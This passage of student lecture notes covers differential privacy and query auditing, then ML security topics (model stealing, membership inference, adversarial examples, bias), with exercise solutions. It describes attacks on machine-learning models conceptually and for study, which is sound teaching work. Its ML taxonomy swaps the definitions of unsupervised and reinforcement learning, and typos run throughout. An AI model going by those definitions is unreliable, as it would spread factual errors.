does not guarantee privacy</li>
</ul></li>
<li>The adversary’s <strong>background can be anything</strong></li>
</ul>
<p>The more cloumns dataset has, the more adversary can abuse the
dataset</p>
<h3 id="interactive-scenation">Interactive scenation</h3>
<p>many times we do not want the data, we want the stats</p>
<p>Redefined goal for the interactivecase: produce an answer that
preserves the utility of the statistics without leaking information
about individuals.</p>
<p>Problem - query might be very specific and reveals private
information.</p>
<p>Let’s audit the queries, if the query will leak, deny! Etieher answer
truthfully or state that there will be no answer</p>
<p>Database assumed to contain numeric values</p>
<p>Not answering the query is in itself information.</p>
<h4 id="when-denying-fails">When denying fails</h4>
<p><strong>Exact values</strong>: Adv asks give me sum (d1, d2, d3),
query answers 15 Adv asks max(d1, d2, d3), query denies It was denied
that if the max is 5, we reveal, but if don’t it is 5</p>
<p><strong>Intervals</strong>: (d1 in 0,100) adv asks give me sum(d1,
d2), query denies Adv asks sum(d2, d3), query answers 50 So now it is
possible to know the intervals</p>
<h4 id="auditing-has-problems">Auditing has problems</h4>
<ul>
<li>Privacy definition? Privacy of Values? Groups? Exact?
<ul>
<li>Algorithmic limitations</li>
<li>Secure deniability implies using algorithms computationally
prohibitive</li>
</ul></li>
<li>Feasible focus mostly on simple queries</li>
<li>Collusion? Either high cost or no security</li>
<li>Utility?
<ul>
<li>Percentage of denials may not be the best meas</li>
</ul></li>
</ul>
<h4 id="differential-privacy">Differential privacy</h4>
<p>Produce answer that preverves the utility of the staticstic without
leaking informatio nabout individuals</p>
<p>To have any utility we <strong>must allow the leakage</strong> of
some information, but we can set a bound on the extent of leakage!</p>
<p><strong>Differential privacy</strong> - Output is similar whether any
single individual’s record is included in the database or not.</p>
<p><strong>Basic philosophy</strong>: instead of the real answer to a
query, add random noise to output, such that by a small change in the
database (someone joins or leaves), the distribution of the answer does
not change much.</p>
<p><strong>A new privacy goal</strong>: minimize the increased risk
incurred by an individual when joining (or leaving) a given
database.</p>
<p>Differential Privacy is a privacy notion <strong>NOT</strong> a
mechanism</p>
<h5 id="formal-definitoin-of-epsilon-differential-privacy">Formal
definitoin of <span class="math inline">\epsilon</span>-differential
privacy</h5>
<p>Principle: the removal/addition of a single record in the database
should/does not substantially affect the values of the computed
funciton/statistics</p>
<p>Formalization: Let A be randomized function to be computed on a set
of records (A is the actual function + noise) Let S be a subset of the
possible values taken by A A provides <span
class="math inline">\epsilon</span>-differential privacy if for all r,S:
<span class="math inline">P[A(D)\in S] \le e^\epsilon \times
P[A(D_{-r})\in S]</span></p>
<h5 id="how-to-achieve">How to achieve?</h5>
<p>Add radnomized noise with Laplacian distribution of parameter <span
class="math inline">\frac{\delta f}{\epsilon}</span>, where <span
class="math inline">\epsilon</span> is the security parameter, <span
class="math inline">\delta f</span> is the sensitivity function of f
(this accounts for how much it needs to obfuscate the data) - <span
class="math inline">\delta f = \max_{r} |f(D) - f(D_{-r})|</span></p>
<p>If the sensitivity is high, we need to put a lot of noise.</p>
<h5 id="how-to-choose-the-parameters">How to choose the parameters</h5>
<p>The parameter <span class="math inline">\epsilon</span> is public,
and we want it to be small (0.01, 0.1).</p>
<p>Utility depends on the sensitivity - if we have a lot of outliers, we
need higher sensitivity.</p>
<h5 id="what-is-the-sensitivity-of">What is the sensitivity of…?</h5>
<p>For any two neighboring databases (D, D_{-r})</p>
<p>Sensitivity of counting queries:</p>
<ul>
<li>the number of elements in the database with a given property P</li>
<li>by adding or deleting one element of the database, F can change by
at most 1</li>
<li>delta f (counting) = 1</li>
</ul>
<h5 id="composability-of-differential-privacy">Composability of
differential privacy</h5>
<p>If there are different algorithms that use independent randomness,
and each algo satisfies epsilon differential pricacy, then all the
answers together outputted is with epsilon = sum of epsilons</p>
<h5 id="how-to-ensure-differential-privacy">How to ensure differential
privacy</h5>
<ul>
<li>Input perturbation
<ul>
<li>Add noise directly to the database ( ≠ perturbed dataset can be
published)
<ul>
<li>(+) independent of the algorithm &amp; easy to reproduce</li>
<li>(-) determining the amount of required noise is difficult</li>
</ul></li>
</ul></li>
<li>Output perturbation
<ul>
<li>Add noise to the function (statistic) output
<ul>
<li>(+) easier to control privacy &amp; better guarantees than input
perturbation</li>
<li>(-) results cannot be reproduced</li>
</ul></li>
</ul></li>
<li>Algorithm Perturbation
<ul>
<li>Inherently add noise to the algo
<ul>
<li>(+) algorithm can be optimized with the noise addition</li>
<li>(-) difficult to generalize &amp; depends on the inputs</li>
</ul></li>
</ul></li>
</ul>
<h5 id="differential-privacy-comes-at-a-cost">Differential privacy comes
at a cost</h5>
<ul>
<li><strong>Impact on accuracy</strong>: we still add noise!</li>
<li><strong>Impact is disparate</strong>: we preserve the average
signal… but not the outliers</li>
<li><strong>Very hard to implement in practice</strong>: sensitivity is
not always obvious to compute, independence is not always
guaranteed</li>
</ul>
<h2 id="exercises-11">Exercises 11</h2>
<p><strong>Exercise 11.1</strong></p>
<p>• Are the following statements true or false? Justify.</p>
<ol type="1">
<li>It is possible to deploy surveillance only on end-users of
systems.</li>
<li>Privacy as control ensures that only the minimal amount of
information is provided to the service.</li>
<li>To provide users with anonymity when accessing a web all accesses
from one user must be unlinkable.</li>
<li>Fine-grained accountability and auditability make it difficult to
implement systems with strong privacy protection.</li>
</ol>
<p>Solution:</p>
<ol type="1">
<li>False. Developers and CEOs of companies, government employees, and
in general everyone is at the end of the day an end-user. Once the
surveillance infrastructure is deployed, everyone will be under
surveillance.</li>
<li>False. The paradigm of privacy as control does not really focus on
quantity. It focuses on the user knowing how the information is going to
be used, but not on minimizing the amount of information disclosed.</li>
<li>True. If accesses by a user are linkable, even if we do not know the
identity, these accesses become a pseudonym. We cannot anymore say that
it is truly anonymous. Thus, in general, unlinkability is needed for
anonymity.</li>
<li>True. Accountability and auditability mainly rely on logging
actions. These logs typically record all actions in the system, becoming
an extra source of information that can be used to infer private
information about users.</li>
</ol>
<p><strong>Exercise 11.2</strong></p>
<p>• Consider a privacy-preserving forum to ask questions in the class.
To provide privacy, when a student posts a question, instead of
publishing the student’s name, it chooses uniformly at random another
name in the class that starts by the same letter. Discuss what is the
privacy this mechanism gives in terms of error the professor for the
following students. Who has more protection? – Charlie, who is in the
class with Celia, Carla, Constantin, and Colin. – Louisa, who is in the
class with Lorenz, Lex, and other two Louisas.</p>
<p>Solution:</p>
<p>In both cases the students enjoy anonymity among the other 5
students. The professor has 1/5 probability of guessing correctly, and
4/5 of making an error. In the case of Louisa, the professor succeeds in
guessing the correct name 3/5 of the time, but he still cannot know with
certainty which of the two Louisas wrote the question. Both students
have the same protection.</p>
<p><strong>Exercise 11.3</strong></p>
<p>• Aggregation is a privacy-protection technique consisting in
regrouping data before processing (more on this in the machine learning
lectures). Discuss what kind of privacy is this from the point of view
of the paradigms (confidentiality, control, practice) or adversary
(social, institutional, anti-surveillance) when:</p>
<ol type="1">
<li>the aggregation is made locally by the user before releasing her
data.</li>
<li>the aggregation by all users is made by a third party.</li>
</ol>
<p>Solution:</p>
<p>We have two cases here:</p>
<ol type="1">
<li>If aggregation is local, from the point of view of the paradigms,
aggregation can be seen as an obfuscation mechanism that aims at
achieving privacy as confidentiality. The idea is to not give the
adversary any information about individuals. As such, we can also
categorize it as anti-surveillance privacy.</li>
<li>When aggregation is on a third party, then, with respect to this
party that sees all the data the protection is privacy as control: we
give the data to this party to only perform the aggregation, and only
share with other parties the aggregated value. We could still say this
is an anti-surveillance privacy mechanism from the point of view of the
final entity that receives the data, but with respect to the aggregator
we would be under institutional privacy assuming that this aggregator is
semi-trusted and will do what is agreed upon and nothing else.</li>
</ol>
<h2 id="ml-security">ML Security</h2>
<h3 id="machine-learning">Machine learning</h3>
<h4 id="ml-taxonomy">ML Taxonomy</h4>
<p>3 areas:</p>
<ul>
<li>supervised learning (labeled data, direct feedback, predict
outcome/future, example - estimate house price) <strong>Most used and
wehere security has been mostly studied</strong>. silo.com lost a lot of
money by evaluating houses using ML model; or HFT</li>
<li>unsupervised learning (decision process, reward system, learn series
of actions, example: learning to play a game)</li>
<li>reinforcement learning (no labels, no feedbacks, “find hidden
structures”, example: customer segmentation)</li>
</ul>
<h4 id="supervised-learning">Supervised learning</h4>
<p>A lot of data points with labels. Then the features are extracted.
Then the weights are applied during training to get a model.</p>
<p>And then using a sample of data and extracted features, they can be
passed through the model to get the label back.</p>
<h4 id="adversary-goals">Adversary goals</h4>
<ul>
<li>give fake input samples (if there is a feedback loop); disturbing
the model to make it misclassify</li>
<li>violate property - steal the model</li>
<li>by querying, could try to extract information that the model
has</li>
<li>violate privacy - steal information or recovering samples</li>
<li>fool the user - Alter the output of the model</li>
</ul>
<h4 id="ml-under-adversarial-conditions">ML under adversarial
conditions</h4>
<p>Confidentiality and privacy: Confidentiality of the model itself
(E.g. intellectual property or it was expensive to train the model)
Privacy of the training or test data (e.g. medical records)</p>
<p>Integrity and availability: Integrity of the predicitons (wrt
expected outcome) Availability of the system deploying machine
learning</p>
<p><strong>Opaque-box attacks</strong>: model arch and parameters
unknown, can only interact blindly with the model</p>
<p><strong>Grey-box attacks</strong>: model arch is known, parameters
unknown Can only interact with the model but has informatio nabout the
type of model</p>
<p><strong>Clear-box attacks</strong>: known arch and parameters Can
replicate the model and use the model’s unternal parameters in the
attack</p>
<p>Opaque-box attacks -&gt; Grey-box attacks -&gt; Clear-box attacks
(higher success rate, but more threatening is the opposite way)</p>
<h3 id="model-stealing">Model stealing</h3>
<h4 id="ml-as-a-service">ML as a service</h4>
<p>it’s not usually run on local, but on cloud</p>
<ol type="1">
<li>Cloud (pre-)trains a classifier using their own data</li>
<li>Make this classifier available as a service for users to query</li>
<li>the user makes a query “given their profile (photos, posts,
metadata) what per has this fb user?”</li>
</ol>
<h4 id="adversary-for-model-stealing">Adversary for model stealing</h4>
<p>so that they don’t have to pay for each query</p>
<p>Confidentiality of the model itself (e.g. intellectual property)</p>
<p>Good ML models require investment:</p>
<ul>
<li>collecting data takes time and money</li>
<li>training infrastructure is expensive</li>
</ul>
<p>goal: “steal” the expensive model by observing its outputs with lower
cost than obtaining the data and training</p>
<h4 id="stealing-a-linear-model">Stealing a linear model</h4>
<p>Assuming the adv knows the model is a linear arch (grey-box model)
and assuming x is two dimensional</p>
<p>Adversary’s goald steal parameters w, b</p>
<p>For n-dimentional x, we need n+1 queries</p>
<h4 id="stealing-non-linear-model">Stealing non-linear model</h4>
<p>Assuming the adv knows the model arch (grey-box model)</p>
<p>Goal: steal parameters w</p>
<p>Do <strong>retraining attack</strong> - observe many queries
X=(x,f(x)) and fit the model on X like on any other training data</p>
<p>Takes many queries, For a nn with 2K parameters, need 11K queries to
get 99.9% similarity. More recent work has reduced these numbers</p>
<p>Given (oracle) query access to a nn, learned through stochastic
gradient descent, we can extract a functionally equivalent model -
locaktion of the critical hyperplanes almost completely determines the
nn</p>
<p><strong>Implication of this attack</strong>: assumption of the field
of secure inference - observing the output of a nn does not reveal the
weights &lt;- this is false, and therefore the field os secure inference
will need to develop new techniques to protect models</p>
<h4 id="preventing-model-stealing">Preventing model stealing</h4>
<p>first attack 2016, first defences - 2017</p>
<p>Output perturbation - add noise to the probabilities output by the
model to hinder reconstruction but not accuracy</p>
<p>Detect suspicious queries - pattern matching technique Identify
deviations from expected on distribution of successive queries from a
client</p>
<h4 id="takeaways-on-model-stealing">Takeaways on model stealing</h4>
<ul>
<li>Many models are susceptible to stealing (recovering parameters or at
minimum extracting sufficient training data)</li>
<li>Complex topic, lots of ongoing research</li>
<li>Crucial issue for MLaaS</li>
<li>Many problems, some solutions</li>
<li>Very young field</li>
</ul>
<h3 id="privacy-challenges-in-ml">Privacy challenges in ML</h3>
<p>There’s always some sort of leakage in models</p>
<p>Privacy-preserving Machine Learning is an active research area</p>
<h4 id="privacy-risks">Privacy risks</h4>
<p>Training: information leaks about data used for training (membership
inference attacks)</p>
<p>Testing: Testing data (or the result) might be sensitive in MLaaS</p>
<p>Tay - MS chatbot which was supposed to have a personality of a
teenage person, and it took a day to make it very racist.</p>
<h4 id="privacy-risks-of-ml">Privacy risks of ML</h4>
<p><strong>Before ML era</strong> user’s data -&gt; services Privacy
threats: colletion of sensitive personal data, re-identification,
inference attacks</p>
<p>Now: user’s data -&gt; ML -&gt; services Do trained models leak
sensiteve data? Can we train good privacy-preserving models?</p>
<h4 id="typical-task---classification">Typical task -
classification</h4>
<p>Training set -&gt; ML model Query -&gt; model -&gt; prediction</p>
<p><strong>Membership inference</strong>: figure out if a certain target
data was in the “sensitive” dataset? E.g. more similar to “reference”
dataset or the “summary statistics” (this would show that it is more in
the sensitive data)</p>
<p><strong>Assumption</strong>: we don’t know the model’s parameters For
ML we don’t know the model’s parameters, but we can classify by inputs
in the training set and inputs not in it.</p>
<p>The attacker can train a similar model to recognize the differences
between the two distributions <strong>without knowing the parameters of
the actual model</strong>. The idea of attacker - leverage sufficient
public data to train the model and then compare.</p>
<p><strong>Assumption</strong>: we don’t know the parameters and we
don’t have access to training data</p>
<p>We train shadow models with the distributions, and with them we train
the attack model to predict if an input wasa member of the training set
(in) or a non-member (out)</p>
<p><strong>Assumption</strong>: we have no knowledge of the underlying
distribution of training data</p>
<p>Use data synthesis to create the data for us. We train on random data
and adjust the random data accordingly, and then retrain the model.</p>
<h4 id="why-do-these-attacks-work">Why do these attacks work?</h4>
<p>Originally the training the the companies do, it
<strong>overfits</strong>, and then the attacker can retrieve a large
amout of the infomation.</p>
<p>Privacy and utility are not in conflict: overfitting is the common
enemy (overfitted models leak training data, and overfitted models lack
preditctive power) Need generalizability and accuracy</p>
<h3 id="altering-the-output">Altering the Output</h3>
<p><strong>Adversarial examples</strong> - inputs that will make ML
fail. working definition: Inputs to a model that an attacker has
designed to cause the model to make a mistake</p>
<p>e.g. Panda image + .007 x Adversarial Perturbation = Panda gets
identified as Gibbon (slightly change the saturation)</p>
<p><strong>Independent and identically distributed (IID) assumptions no
longer hold</strong></p>
<ol type="1">
<li>Identical: inputs are intentionally manipulated to not belong to the
training distribution</li>
<li>Independence: inputs are no longer drawn independently; the attacker
may sample from a single input repeatedly.</li>
</ol>
<h4 id="adversarial-example-problem">Adversarial example problem</h4>
<p>ML training: Objective: find model parameters that minimize empirical
loss</p>
<p>x, y in training data X with some loss function which takes x, y and
parameters w These weights are trained using gradient descent to
<strong>minimize</strong> loss</p>
<p>Adversarial example problem <strong>goal</strong>: find a
perturbation that <strong>maximizes</strong> loss, that pushes the
sample in another feature space find maximized loss such that the, that
pushes the sample in another feature space</p>
<p>Similarity relation is often represented as adversarial cost
constraint.</p>
<p>Constraint on perturbation norm assumes that similar images are close
in e.g. Euclidean distance (this is not always true) For example,
similarity could be defined as small affine transformation, and then
gets misclassified. Feature extraction could be wrong because of the
transformation.</p>
<p>Attacks don’t have to be imperceptible - sometimes image can be
altered even it is seen and that makes the model misclassify.</p>
<p>How to solve optimization problem where there are limited pixel
changes: define the problem as gradient descent attack, where the
direction is taken towards maximum loss, and project to meet
constraint.</p>
<h4 id="transferability-property">Transferability property</h4>
<p>Adversarial examples have a <strong>transferability</strong> property
- samples crafted to mislead a model A are likely to mislead a model
B</p>
<p>In the most extreme case, it is possible to construct a single
perturbation that will fool a model when added to any image. -&gt;
Attackers need minimal resources to attack the system</p>
<h4 id="defending-against-adversarial-examples">Defending against
adversarial examples</h4>
<p>Defending in general is very hard. - you cannot add noise to defend
Can only defend against a particular threat model (e.g. perturbations up
to epsilon norm), and normally no guarantees</p>
<p>Sandard way is <strong>adversarial training</strong> (based on
<em>robust optimization</em>). It means training on simulated
adversarial examples.</p>
<h4 id="preventing-adversarial-examples">Preventing adversarial
examples</h4>
<p>Certified defenses: ensure that no example can exist inside a ball
with radius the norm used for the perturbation (train multiple models
and have the answer that the models have to agree on)</p>
<p>Detect suspicious queries: identify deviations from expected on
distribution of successive queries form a client</p>
<p>(unclear whether they are really effective)</p>
<p><strong>Attackers are not restricted to computer vision</strong></p>
<h3 id="biases-and-fallacies">Biases and Fallacies</h3>
<h4 id="base-rate-fallacy-prosecutors-fallacy">Base rate fallacy /
Prosecutor’s fallacy</h4>
<p>We assume equal distribution of cases, if they are not we falsely
interpret results</p>
<p>AI performance metrics - example of hate speech detection - sets are
not the same</p>
<p>TP: prediction prediction hate speech in hate speech FN: prediction
prediciton not hate speech in hate speech TN: prediction not hate speech
in not hate speech FP: prediction hate speech - in not hate speech</p>
<h4 id="distributional-shift">Distributional shift</h4>
<p>Because of the size of the training set certain classes could be
classified less accurately</p>
<h4 id="transparency">Transparency</h4>
<p>Classification Task: Should we send a patient with Bronchitis home?
Rule-Based Learning If x, then y Human readable rules: causation is
intrinsic</p>
<p>Machine Learning Better accuracy Not directly possible to understand
why a decision is made</p>
<h4 id="bias-reinforcement">Bias reinforcement</h4>
<p>it is a bigger problem because bias gets completely implemented in
reinforcement learning</p>
<p><strong>Bias</strong> Statistical bias: difference between an
estimator expected value and the true value Very limited! Nothing about
errors, nothing about distributional shift</p>
<p>Group fairness: outcome should not differ between demographic
groups</p>
<p>Individual fairness: similar? individuals should be treated
similarly?</p>
<h2 id="exercises-12">Exercises 12</h2>
<p><strong>Exercise 12.1</strong></p>
<p>• Are the following statements true or false? Justify.</p>
<ol type="1">
<li>Stealing non-linear models is impossible because models are too
complex.</li>
<li>As a defender of a machine learning model you should be more worried
about black-box effective attacks than white-box effective attacks.</li>
<li>Privacy problems in machine learning stem solely from the need for
data to train models.</li>
<li>Poisoning attacks can be used to increase vulnerability to
adversarial examples.</li>
</ol>
<p>Solution:</p>
<ol type="1">
<li>False. Stealing non-linear models is more costly than stealing
linear models, but can be done. Linear models can be stolen by solving a
simple system of linear equations, which is not possible for non-linear
functions. However, one can steal the model by using the target as a
“labeler” in order to train a new model that performs similarly to the
target itself.</li>
<li>True. An adversary performing a black-box attack needs much less
resources and capabilities than a white-box adversary. This is much more
dangerous, as the adversary only needs the ability to interact with the
model.</li>
<li>False. Data collection for training is one of many privacy attack
vectors in machine learning. There exist attacks on models and outputs;
and naturally exposing data for test is a risk in itself.</li>
<li>True. By providing poisoning inputs, the adversary gets to shape the
boundaries of the model. Thus, she can carve this boundary to facilitate
classification errors. In fact, you can understand a backdoor attack as
a particular instance of an adversarial example.</li>
</ol>
<p><strong>Exercise 12.2</strong></p>
<p>• A typical approach to avoid the processing of individual’s personal
data is aggregation. Discuss whether this is a good technique to avoid
privacy risks when collecting data for training machine learning
models.</p>
<p>Solution:</p>
<p>Aggregation is a poor choice to enable privacy-preserving training of
machine learning models. Three main issues:</p>
<ol type="1">
<li>Where / when do you do the aggregation? To aggregate you still need
to collect the data. How to aggregate in a privacy-preserving way is
also a hard problem as we explained in the next lectures. Also, on what
groups should one aggregate? Depending on the task it may be better to
aggregate on some users or on others. Deciding on which patients and how
often to aggregate may affect both the privacy properties and utility of
the aggregation (see the following two points).</li>
<li>The privacy provided by aggregation depends on the adversary’s
knowledge. We can learn membership/attributes from aggregates (think of
the aggregates as a very, very simple machine learning model). Also,
aggregates only protect when there is something to aggregate. Imagine a
situation in which all samples in a dataset have cancer. Aggregation
will not protect the privacy of these patients.</li>
<li>Aggregation has great impact on utility, in particular for
personalization-oriened tasks.</li>
</ol>
<p><strong>Exercise 12.3</strong></p>
<p>• Can we prevent adversarial examples using encryption? • And
poisoning attacks?</p>
<p>Solution:</p>
<p>No. None of them can be solved by encryption. The problem is derived
from weaknesses in the model introduced by training or testing samples.
Encrypting these samples does not change</p>
</body>
</html>
